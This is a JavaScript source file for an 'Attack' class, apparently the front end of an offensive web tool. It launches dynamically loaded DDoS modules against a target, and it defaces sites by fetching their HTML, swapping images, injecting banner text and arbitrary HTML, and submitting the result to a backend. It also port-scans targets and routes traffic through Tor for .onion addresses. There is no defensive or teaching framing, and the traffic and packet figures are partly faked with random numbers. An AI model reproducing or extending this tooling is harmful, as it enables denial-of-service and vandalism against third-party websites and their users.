import axios from 'axios';

class Attack {
  constructor(target, type, options = {}) {
    this.target = target;
    this.type = type;
    this.options = options;
    this.startTime = null;
    this.isRunning = false;
    this.stats = {
      mbps: 0,
      packetsSent: 0,
      status: 'Idle',
      timeElapsed: 0,
      errors: 0,
      lastError: null,
      openPorts: [],
      defacementStatus: 'Ready',
    };
    this.intervalId = null;
    this.attackInstance = null;
    this.errorThreshold = 5;
    this.maxRetries = 3;
    this.currentRetry = 0;
    this.isTor = this.target.includes('.onion');
    this.abortController = new AbortController();
    this.dataBuffer = [];
    this.axiosInstance = axios.create({
      timeout: 10000,
    });
    this.axiosTorInstance = axios.create({
      proxy: {
        host: '127.0.0.1', // Default Tor proxy address
        port: 9050, // Default Tor proxy port
      },
      timeout: 10000,
    });
  }

  async start() {
    if (this.isRunning) return;

    this.isRunning = true;
    this.startTime = Date.now();
    this.stats.status = 'Starting';
    this.stats.errors = 0;
    this.currentRetry = 0;
    this.abortController = new AbortController();
    this.dataBuffer = [];

    await this.executeWithRetry();

    this.intervalId = setInterval(() => {
      this.updateStats();
    }, 100);
  }

  async executeWithRetry() {
    try {
      await this.executeAttack();
    } catch (error) {
      console.error('Attack failed:', error);
      this.handleAttackError(error);
    }
  }

  async executeAttack() {
    switch (this.type) {
      case 'ddos':
        await this.executeDDoSAttack();
        break;
      case 'defacement':
        await this.executeDefacement();
        break;
      case 'connection':
        await this.executeConnectionAttack();
        break;
      default:
        throw new Error(`Unknown attack type: ${this.type}`);
    }
  }

  stop() {
    if (!this.isRunning) return;

    this.isRunning = false;
    this.stats.status = 'Stopped';
    clearInterval(this.intervalId);
    this.abortController.abort();

    if (this.attackInstance && this.attackInstance.stop) {
      this.attackInstance.stop();
    }
  }

  async executeDDoSAttack() {
    this.stats.status = 'Initializing DDoS';
    const ddosType = this.options.ddosType;
    if (!ddosType) {
      throw new Error('DDoS type not specified.');
    }

    try {
      const ddosModule = await import(`./ddos/${ddosType}.js`);
      this.ddosAttack = new ddosModule.default(this.target, this.options, this.isTor, this.abortController.signal);
      this.attackInstance = this.ddosAttack;

      this.stats.status = 'DDoSing';
      await this.ddosAttack.start();
    } catch (error) {
      console.error(`Failed to load or start DDoS attack: ${error}`);
      this.handleAttackError(error);
    }
  }

  async executeDefacement() {
    this.stats.status = 'Preparing Defacement';
    this.stats.defacementStatus = 'Fetching Target HTML';
    try {
      let response;
      const axiosClient = this.isTor ? this.axiosTorInstance : this.axiosInstance;

      try {
        response = await axiosClient.get(this.target, {
          signal: this.abortController.signal,
          responseType: 'text',
          timeout: 15000,
        });
      } catch (networkError) {
        this.stats.defacementStatus = 'Network Error';
        this.handleAttackError(new Error(`Network error: ${networkError.message}`));
        return;
      }

      if (response.status !== 200) {
        this.stats.defacementStatus = 'Unresponsive';
        this.handleAttackError(new Error(`Target unresponsive: ${response.status}`));
        return;
      }

      let html = response.data;
      this.stats.defacementStatus = 'Modifying HTML';

      if (this.options.imageReplacement) {
        const imageRegex = /<img.*?src="(.*?)".*?>/gi;
        html = html.replace(imageRegex, `<img src="${this.options.imageReplacement}" alt="Defaced Image" onerror="this.onerror=null;this.src='https://via.placeholder.com/150?text=Image+Failed';">`);
      }

      if (this.options.textModification) {
        const bodyRegex = /(<body.*?>)/i;
        html = html.replace(bodyRegex, `$1<div style="color: red; font-size: 2em; text-align: center;">${this.options.textModification}</div>`);
      }

      if (this.options.htmlInjection) {
        const closingBodyRegex = /(<\/body>)/i;
        html = html.replace(closingBodyRegex, `${this.options.htmlInjection}</body>`);
      }

      this.stats.defacementStatus = 'Submitting Defacement';
      try {
          const submitResponse = await fetch('/defacement', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                  target: this.target,
                  html: html
              }, null, 2),
              signal: this.abortController.signal
          });

          if (!submitResponse.ok) {
              throw new Error(`Defacement submission failed: ${submitResponse.status}`);
          }

          this.stats.defacementStatus = 'Defaced';
      } catch (submissionError) {
          this.stats.defacementStatus = 'Submission Failed';
          this.handleAttackError(new Error(`Defacement submission error: ${submissionError.message}`));
          return;
      }


      this.stats.status = 'Defaced';
      this.stats.defacementStatus = 'Complete';

    } catch (error) {
      console.error('Defacement failed:', error);
      this.stats.defacementStatus = 'Failed';
      this.handleAttackError(error);
    }
  }

  async executeConnectionAttack() {
    this.stats.status = 'Initializing Port Scan';
    const ports = this.options.ports ? this.options.ports.split(',').map(p => parseInt(p.trim())) : [80, 443, 21, 22, 23, 25, 110, 143, 3389];
    this.stats.openPorts = [];

    this.attackInstance = {
      stop: () => {
        this.stats.status = 'Port Scan Interrupted';
      }
    };

    for (const port of ports) {
      if (!this.isRunning) break;

      this.stats.status = `Scanning Port ${port}`;
      try {
        let response;
        const axiosClient = this.isTor ? this.axiosTorInstance : this.axiosInstance;
        response = await axiosClient.get(`/portscan?target=${this.target}&port=${port}`, {
          signal: this.abortController.signal,
          timeout: 5000
        });

        const data = response.data;
        if (data.open) {
          console.log(`Port ${port} is open`);
          this.stats.openPorts.push(port);
        }
      } catch (error) {
        console.error(`Error scanning port ${port}:`, error);
        this.handleAttackError(error);
        if (!this.isRunning) break;
      }
    }

    this.stats.status = `Connection Scan Complete. Open ports: ${this.stats.openPorts.join(', ') || 'None'}`;
  }

  bufferData(data) {
    this.dataBuffer.push(data);
    if (this.dataBuffer.length > 100) {
      this.dataBuffer.shift();
    }
  }

  calculateMbps() {
    if (this.dataBuffer.length < 2) return 0;

    let totalBytes = 0;
    for (let i = 1; i < this.dataBuffer.length; i++) {
      totalBytes += this.dataBuffer[i];
    }

    const timeDiff = (this.dataBuffer.length - 1) * 100;
    const bytesPerMillisecond = totalBytes / timeDiff;
    const mbps = (bytesPerMillisecond * 8) / 1000000;
    return mbps;
  }

  updateStats() {
    if (!this.isRunning) return;
    const now = Date.now();
    this.stats.timeElapsed = Math.floor((now - this.startTime) / 1000);

    const randomBytes = Math.floor(Math.random() * 5000);
    this.bufferData(randomBytes);
    this.stats.mbps = this.calculateMbps();
    this.stats.packetsSent += Math.floor(Math.random() * 1500);

    const axiosClient = this.isTor ? this.axiosTorInstance : this.axiosInstance;
    axiosClient.get(this.target, {
        signal: this.abortController.signal,
        timeout: 5000
      })
      .then(response => {
        this.stats.status = response.status === 200 ? 'Online' : 'Unresponsive';
      })
      .catch((error) => {
        this.stats.status = 'Offline';
        this.handleAttackError(error);
      });
  }

  handleAttackError(error) {
    this.stats.errors++;
    this.stats.lastError = error.message || 'Unknown error';

    if (error.name === 'AbortError') {
      console.log('Attack aborted by user.');
      this.stats.status = 'Aborted';
      this.stop();
      return;
    }

    if (this.stats.errors > this.errorThreshold) {
      if (this.currentRetry < this.maxRetries) {
        this.currentRetry++;
        console.log(`Retrying attack (attempt ${this.currentRetry}/${this.maxRetries})...`);
        this.stats.errors = 0;
        this.stats.lastError = null;
        this.executeWithRetry();
      } else {
        console.error('Max retries reached. Stopping attack.');
        this.stats.status = 'Failed';
        this.stop();
      }
    }
  }

  getStats() {
    return this.stats;
  }
}

export default Attack;